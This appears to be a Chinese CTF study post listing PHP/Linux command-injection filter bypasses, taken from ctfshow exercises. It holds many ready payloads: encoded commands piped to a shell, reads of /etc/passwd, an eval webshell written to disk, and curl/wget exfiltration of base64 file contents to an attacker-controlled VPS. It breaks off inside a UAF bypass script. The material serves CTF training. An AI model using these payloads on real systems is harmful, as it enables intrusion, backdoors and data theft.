    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="RCE-命令、代码执行-总结"><a href="#RCE-命令、代码执行-总结" class="headerlink" title="RCE(命令、代码执行)总结"></a>RCE(命令、代码执行)总结</h2><h3 id="1、过滤cat、flag等关键字"><a href="#1、过滤cat、flag等关键字" class="headerlink" title="1、过滤cat、flag等关键字"></a>1、过滤cat、flag等关键字</h3><h4 id="1-1-常见linux系统命令"><a href="#1-1-常见linux系统命令" class="headerlink" title="1.1 常见linux系统命令"></a>1.1 常见linux系统命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>strings<br>rev<br></code></pre></td></tr></table></figure><h4 id="1-2-使用转义符"><a href="#1-2-使用转义符" class="headerlink" title="1.2 使用转义符"></a>1.2 使用转义符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ca\t fl\ag ;<br></code></pre></td></tr></table></figure><h4 id="1-3-使用引号"><a href="#1-3-使用引号" class="headerlink" title="1.3 使用引号"></a>1.3 使用引号</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ca&#x27;&#x27;t  fl&#x27;&#x27;ag;<br></code></pre></td></tr></table></figure><h4 id="1-4-内联执行绕过"><a href="#1-4-内联执行绕过" class="headerlink" title="1.4 内联执行绕过"></a>1.4 内联执行绕过</h4><p>拼接 <code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=a=ag;b=fl;cat $b<span class="hljs-variable">$a</span>;   <span class="hljs-comment">//相当于 cat flag</span><br></code></pre></td></tr></table></figure><p>第二种:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//当前目录下有 index.php、flag.php</span><br>cat `ls`;<br><span class="hljs-comment">//相当于 cat index.php;cat flag.php, 将ls命令的结果给cat去执行</span><br></code></pre></td></tr></table></figure><h4 id="1-5-编码绕过"><a href="#1-5-编码绕过" class="headerlink" title="1.5 编码绕过"></a>1.5 编码绕过</h4><p><strong>base64编码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">[root~]<span class="hljs-comment"># echo &#x27;cat flag.txt&#x27; | base64</span><br>Y2F0IGZsYWcudHh0Cg==<br>[root~]<span class="hljs-comment"># echo Y2F0IGZsYWcudHh0Cg== | base64 -d</span><br>cat flag.txt<br>    <br>[root~]<span class="hljs-comment"># echo Y2F0IGZsYWcudHh0Cg== | base64 -d | sh</span><br>flag&#123;flag_is_here&#125;<br>[root~]<span class="hljs-comment"># echo Y2F0IGZsYWcudHh0Cg== | base64 -d | bash</span><br>flag&#123;flag_is_here&#125;<br></code></pre></td></tr></table></figure><h4 id="1-6-进制绕过"><a href="#1-6-进制绕过" class="headerlink" title="1.6 进制绕过"></a>1.6 进制绕过</h4><p><strong>16进制</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">[root~]<span class="hljs-comment"># echo cat flag.txt | xxd </span><br><span class="hljs-number">6361</span> <span class="hljs-number">7420</span> <span class="hljs-number">666</span>c <span class="hljs-number">6167</span> <span class="hljs-number">2e74</span> <span class="hljs-number">7874</span> <span class="hljs-number">0</span>a<br>[root~]<span class="hljs-comment"># echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p</span><br>cat flag.txt<br>[root~]<span class="hljs-comment"># echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p | bash  或 | sh</span><br>flag&#123;flag_is_here&#125;<br><br><br>[root~]<span class="hljs-comment"># $(printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;)  //cat flag.txt 16进制</span><br>flag&#123;flag_is_here&#125;<br></code></pre></td></tr></table></figure><p><strong>8进制</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">[root~]<span class="hljs-comment"># $(printf &quot;\143\141\164\40\146\154\141\147\56\164\170\164&quot;)  </span><br>flag&#123;flag_is_here&#125;<br></code></pre></td></tr></table></figure><h4 id="1-7-过滤文件名-如：-etc-passwd文件"><a href="#1-7-过滤文件名-如：-etc-passwd文件" class="headerlink" title="1.7 过滤文件名(如： &#x2F;etc&#x2F;passwd文件)"></a>1.7 过滤文件名(如： &#x2F;etc&#x2F;passwd文件)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>) 利用正则匹配绕过<br><br>[root~]<span class="hljs-comment"># cat /???/pass*</span><br><br><span class="hljs-number">2</span>) 例如过滤/etc/passwd中的etc，利用未初始化变量，使用<span class="hljs-variable">$u</span>绕过<br><br>[root~]<span class="hljs-comment"># cat /etc$u/passwd</span><br></code></pre></td></tr></table></figure><h4 id="1-8-使用-和-，-x-x"><a href="#1-8-使用-和-，-x-x" class="headerlink" title="1.8 使用$*和$@，$x,${x}"></a>1.8 使用<code>$*</code>和<code>$@</code>，<code>$x</code>,<code>$&#123;x&#125;</code></h4><p><img src="https://s2.loli.net/2022/12/26/Z5yPHrl731gNX9z.png" alt="在这里插入图片描述"></p><h4 id="1-9-读取文件命令"><a href="#1-9-读取文件命令" class="headerlink" title="1.9 读取文件命令"></a>1.9 读取文件命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">curl file:<span class="hljs-comment">///root/Desktop/flag.txt</span><br>strings flag.txt<br>uniq -c/etc/passwd<br>bash -v /etc/passwd<br>rev /etc/passwd<br>sort flag.txt<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/27/9rAZEXSnukCjUyP.png" alt="image-20221227000353472" style="zoom: 33%;" /><h4 id="1-10-查找文件命令-find"><a href="#1-10-查找文件命令-find" class="headerlink" title="1.10 查找文件命令(find)"></a>1.10 查找文件命令(find)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">find . -name f*   //查找当前目录下f开头的文件</span><br>./flag.txt<br></code></pre></td></tr></table></figure><h3 id="2、rce常见php函数"><a href="#2、rce常见php函数" class="headerlink" title="2、rce常见php函数"></a>2、rce常见php函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()  执行命令<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-title function_ invoke__">popen</span>()<br><span class="hljs-title function_ invoke__">pcntl_exec</span>()<br>反引号  同<span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-keyword">eval</span>()  执行命令<br><span class="hljs-title function_ invoke__">show_source</span>() 高亮显示文件<br><span class="hljs-title function_ invoke__">highlight_file</span>()  高亮显示文件<br><span class="hljs-title function_ invoke__">array_reverse</span>()  反向输出元素<br><span class="hljs-title function_ invoke__">pos</span>()  输出当前元素的值<br><span class="hljs-title function_ invoke__">localeconv</span>()  返回一包含本地数字及货币格式信息的数组<br><span class="hljs-keyword">include</span>  一般用于括号被过滤的情况，因为可以不用括号<br><span class="hljs-keyword">require</span>  一般用于括号被过滤的情况，因为可以不用括号<br><span class="hljs-keyword">echo</span>()  输出<br><span class="hljs-title function_ invoke__">next</span>()  下一个元素<br></code></pre></td></tr></table></figure><h3 id="3、rce常见linux系统命令"><a href="#3、rce常见linux系统命令" class="headerlink" title="3、rce常见linux系统命令"></a>3、rce常见linux系统命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>strings<br>rev反过来输出文件内容<br></code></pre></td></tr></table></figure><h3 id="4、过滤空格"><a href="#4、过滤空格" class="headerlink" title="4、过滤空格"></a>4、过滤空格</h3><ul><li>%09（url传递）(<code>cat%09flag.php</code>)</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;&gt;（<code>cat&lt;&gt;/flag</code>）</li><li>&lt;（<code>cat&lt;/flag</code>）      输入重定向</li><li>{cat,flag}</li></ul><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">eg.<br>&#123;<span class="hljs-built_in">ls</span>,&#125;<br>&#123;<span class="hljs-built_in">cat</span>,flags&#125;<br>&#123;<span class="hljs-built_in">mv</span>,flags,flag&#125;<br></code></pre></td></tr></table></figure><h3 id="5、过滤目录分隔符"><a href="#5、过滤目录分隔符" class="headerlink" title="5、过滤目录分隔符 &#x2F;"></a>5、过滤目录分隔符 &#x2F;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>采用多个命令即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?ip=;cd flag_is_here;cat f*;<br></code></pre></td></tr></table></figure><h3 id="6、过滤分隔符"><a href="#6、过滤分隔符" class="headerlink" title="6、过滤分隔符 ;"></a>6、过滤分隔符 ;</h3><p>1，可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</p><blockquote><p>功能符号payload<br>换行符%0a?cmd&#x3D;123%0als<br>回车符%0d?cmd&#x3D;123%0dls<br>连续指令;?1&#x3D;123;pwd<br>后台进程&amp;?1&#x3D;123&amp;pwd<br>管道|?1&#x3D;123|pwd<br>逻辑运算||或&amp;&amp;?1&#x3D;123&amp;&amp;pwd</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">;<span class="hljs-comment">//分号</span><br>|<span class="hljs-comment">//把前面输出的当作后面的输入 (管道符)</span><br>||<span class="hljs-comment">//前面为假才执行后面的指令</span><br>&amp;<span class="hljs-comment">//两条命令都会执行</span><br>&amp;&amp;<span class="hljs-comment">//前面为假，后面不执行</span><br></code></pre></td></tr></table></figure><p>2，<code>?&gt;</code>代替<code>;</code></p><p>在php中可以用<code>?&gt;</code>来代替最后一个<code>;</code>因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。<br>例题：ctfshow-web入门36</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题过滤了分号，直接用?&gt;来代替分号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-meta">?&gt;</span>&amp;a=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="7、shell-exec等无回显函数"><a href="#7、shell-exec等无回显函数" class="headerlink" title="7、shell_exec等无回显函数"></a>7、shell_exec等无回显函数</h3><p>复制，压缩，写shell等方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">copy flag.php <span class="hljs-number">1</span>.txt<span class="hljs-comment">//复制</span><br>mv flag.php flag.txt<span class="hljs-comment">//改名</span><br>cat flag.php &gt; flag.txt<br>tar cvf flag.tar flag.php<span class="hljs-comment">//压缩</span><br>tar zcvf flag.tar.gz flag.php<br><span class="hljs-keyword">echo</span> <span class="hljs-number">3</span>c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot;</span> &gt; webshell.php<span class="hljs-comment">//写入webshell</span><br></code></pre></td></tr></table></figure><p><strong>在vps上建立记录脚本</strong></p><p>在自己的公网服务器站点根目录写入php文件，内容如下：<br>record.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">curl http:<span class="hljs-comment">//*.*.*.**/record.php?data=`cat flag.php|base64`</span><br>wget http:<span class="hljs-comment">//*.*.*.*/record.php?data=`cat flag.php|base64`</span><br></code></pre></td></tr></table></figure><h4 id="dev-null-2-1类无回显"><a href="#dev-null-2-1类无回显" class="headerlink" title="&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显"></a>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</h4><p>ctfshow-web入门42-wp</p><h3 id="8、无数字字母getshell"><a href="#8、无数字字母getshell" class="headerlink" title="8、无数字字母getshell"></a>8、无数字字母getshell</h3><p>异或、取反、自增、或、上传临时文件</p><h3 id="9、过滤括号"><a href="#9、过滤括号" class="headerlink" title="9、过滤括号"></a>9、过滤括号</h3><p><strong>使用不需要括号的函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> `cat /flag` <br></code></pre></td></tr></table></figure><ul><li><p>require、include</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;/flag&#x27;</span><br><span class="hljs-keyword">include</span>%<span class="hljs-number">09</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>可以取反两次</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">require</span>~~flag.txt<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">require</span>~%d0%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>e%<span class="hljs-number">98</span><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="10、无参数RCE"><a href="#10、无参数RCE" class="headerlink" title="10、无参数RCE"></a>10、无参数RCE</h3><h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h4><blockquote><p>返回由所有已定义变量所组成的数组</p></blockquote><h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h4><blockquote><p>可以获取PHPSESSID的值</p></blockquote><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">无参数RCE</a></p><p><img src="https://s2.loli.net/2022/12/27/tbqwIA7fRl8mFnU.png" alt="在这里插入图片描述"></p><p>读取目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br></code></pre></td></tr></table></figure><h3 id="11、内联执行"><a href="#11、内联执行" class="headerlink" title="11、内联执行"></a>11、内联执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> `ls`;<br><span class="hljs-keyword">echo</span> $(ls);<br><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`ls`;<br><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>$(ls);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/27/RY4JmCADscxKjGi.png" alt="在这里插入图片描述"></p><p>将&#96;&#96;或$()内命令的输出作为输入执行</p><h3 id="12、open-basedir绕过"><a href="#12、open-basedir绕过" class="headerlink" title="12、open_basedir绕过"></a>12、open_basedir绕过</h3><p><strong>glob伪协议：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="hljs-comment">// 并打印文件名和文件尺寸</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://ext/spl/examples/*.php&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s: %.1FK\n&quot;</span>, <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>(), <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">getSize</span>()/<span class="hljs-number">1024</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>symlink()函数</strong></p><h3 id="13、disable-function绕过"><a href="#13、disable-function绕过" class="headerlink" title="13、disable_function绕过"></a>13、disable_function绕过</h3><h3 id="14、通配符-绝对路径调用命令"><a href="#14、通配符-绝对路径调用命令" class="headerlink" title="14、通配符+绝对路径调用命令"></a>14、通配符+绝对路径调用命令</h3><p><img src="https://s2.loli.net/2022/12/27/BziCvY1ENDhMFGX.png" alt="在这里插入图片描述"></p><p>一些常用工具所在目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">/bin/cat<br>/bin/base64 flag.php    <span class="hljs-comment">//base64编码flag.php的内容。</span><br>/usr/bin/bzip2 flag.php <span class="hljs-comment">//将flag.php文件进行压缩，然后再将其下载。</span><br>    <br>/???/????<span class="hljs-number">64</span> ????.???  <span class="hljs-comment">#/bin/base64 flag.php</span><br>/???/???/????<span class="hljs-number">2</span> ????.??? <span class="hljs-comment">#/usr/bin/bzip2 flag.php</span><br></code></pre></td></tr></table></figure><p>例题：ctfshow-web入门55</p><h3 id="15、使用-构造数字"><a href="#15、使用-构造数字" class="headerlink" title="15、使用~$()构造数字"></a>15、使用~$()构造数字</h3><p>ctfshow-web入门57</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$(())=<span class="hljs-number">0</span><br>$((~$(())))=-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/27/waXI2Exb8dVoUNi.png" alt="在这里插入图片描述"></p><h3 id="16、-uaf脚本绕过disable-function"><a href="#16、-uaf脚本绕过disable-function" class="headerlink" title="16、 uaf脚本绕过disable_function"></a>16、 uaf脚本绕过disable_function</h3><p>例题：ctfshow-web入门72</p><p>脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 